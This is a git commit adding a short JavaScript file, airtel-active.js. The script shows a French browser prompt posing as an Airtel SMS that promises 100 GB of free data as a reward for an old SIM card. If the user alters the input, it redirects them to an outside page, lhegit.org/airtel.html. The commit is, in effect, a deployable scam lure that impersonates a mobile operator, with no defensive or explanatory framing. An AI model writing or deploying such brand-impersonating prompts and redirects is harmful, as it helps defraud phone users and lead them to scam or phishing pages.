6edfb5ed93f0aa15bbefce673b1b5cdc5d120df7
itidnewblog3 <ukpehaitid1@gmail.com>
2025-09-22 08:03:02 +0100

    Create airtel-active.js

---
+++ airtel-active.js
@@ -0,0 +1,5 @@
+var password = 'Activer 100 Go'
+password=prompt('SMS: Félicitations, votre carte SIM Airtel est éligible pour recevoir des données gratuites en récompense de votre ancienne carte SIM, cliquez sur OK pour activer','Activer 100 Go');
+if (password != 'Activer 100 Go') {
+location.href='https://lhegit.org/airtel.html';
+}
